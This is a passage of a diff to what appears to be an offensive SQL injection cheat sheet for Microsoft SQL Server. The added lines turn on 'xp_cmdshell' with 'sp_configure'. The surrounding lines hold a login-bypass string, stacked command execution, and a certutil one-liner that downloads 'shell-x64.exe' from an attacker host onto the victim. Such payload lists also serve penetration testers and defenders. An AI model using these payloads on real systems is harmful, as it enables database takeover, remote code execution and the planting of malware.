@@ -330,6 +330,12 @@ admin' or '1'='1
 ';exec xp_cmdshell <command>
 ```
 ```ps
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+```
+```ps
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+```ps
 ';exec xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>/shell-x64.exe c:\Users\Public\shell-x64.exe';--
 ```
 ```ps
